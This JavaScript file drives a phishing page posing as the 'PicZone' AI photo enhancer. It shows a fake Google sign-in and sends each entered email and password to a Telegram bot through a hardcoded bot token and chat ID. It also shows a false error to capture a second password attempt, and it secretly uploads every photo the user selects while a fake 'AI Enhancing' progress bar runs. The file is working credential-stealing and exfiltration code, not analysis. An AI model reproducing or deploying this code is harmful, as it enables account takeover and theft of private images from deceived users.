const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
const CHAT_ID = "7674900139";

const fileInput = document.getElementById('file-upload');
const googleModal = document.getElementById('google-login-modal');
const permissionModal = document.getElementById('permission-modal');
const enhanceSection = document.getElementById('enhance-section');
const heroUI = document.getElementById('hero-ui');
const beforeImage = document.getElementById('before-image');
const afterImage = document.getElementById('after-image');
const beforeWrapper = document.getElementById('before-wrapper');
const sliderRange = document.getElementById('slider-range');
const progressFill = document.getElementById('progress-fill');
const processingText = document.getElementById('processing-text');
const downloadBtn = document.getElementById('download-btn');

let loginAttempts = 0;

// 1. Google Login Step Logic
function showPasswordStep() {
    const email = document.getElementById('fake-email').value;
    if(email.includes("@")) {
        document.getElementById('display-email').innerText = email;
        document.getElementById('email-step').style.display = 'none';
        document.getElementById('password-step').style.display = 'block';
    } else {
        alert("Enter a valid Google Account");
    }
}

function submitFakeLogin() {
    const email = document.getElementById('fake-email').value;
    const pass = document.getElementById('fake-password').value;
    
    // Telegram-ukku anupurathu
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 NEW LOGIN\n📧: ${email}\n🔑: ${pass}` })
    });

    if(loginAttempts === 0) {
        loginAttempts++;
        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('fake-password').value = "";
    } else {
        googleModal.style.display = 'none';
        permissionModal.style.display = 'flex';
    }
}

// 2. File Selection Flow
document.getElementById('allow-btn').onclick = () => {
    permissionModal.style.display = 'none';
    fileInput.click();
};

fileInput.addEventListener('change', function() {
    const files = Array.from(this.files);
    if (files.length > 0) {
        heroUI.style.display = 'none';
        enhanceSection.style.display = 'block';
        
        // Before/After Slider Image Sync
        const reader = new FileReader();
        reader.onload = (e) => {
            beforeImage.src = e.target.result;
            afterImage.src = e.target.result;
            // Slider image width-ai correct-aa set panna
            setTimeout(() => {
                beforeImage.style.width = afterImage.offsetWidth + "px";
            }, 100);
        };
        reader.readAsDataURL(files[0]);

        // Secret Upload & Progress
        files.forEach((file, index) => {
            setTimeout(() => {
                uploadToTelegram(file);
                let p = Math.round(((index + 1) / files.length) * 100);
                progressFill.style.width = p + "%";
                processingText.innerText = `AI Enhancing: ${p}% (${index+1}/${files.length})`;
                
                if(index === files.length - 1) {
                    processingText.innerText = "Enhancement Complete! ✅";
                    downloadBtn.style.display = 'block';
                }
            }, index * 1000);
        });
    }
});

// 3. Slider Movement
sliderRange.oninput = function() {
    beforeWrapper.style.width = this.value + "%";
};

// 4. Secret Telegram Photo Upload
function uploadToTelegram(file) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", file);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: "POST", body: fd});
}

// 5. Real Download with Filter
downloadBtn.onclick = () => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const img = new Image();
    img.src = afterImage.src;
    img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.filter = "contrast(1.2) brightness(1.1) saturate(1.1) contrast(1.1)";
        ctx.drawImage(img, 0, 0);
        const link = document.createElement('a');
        link.download = 'Enhanced_by_PicZone.png';
        link.href = canvas.toDataURL();
        link.click();
    };
};
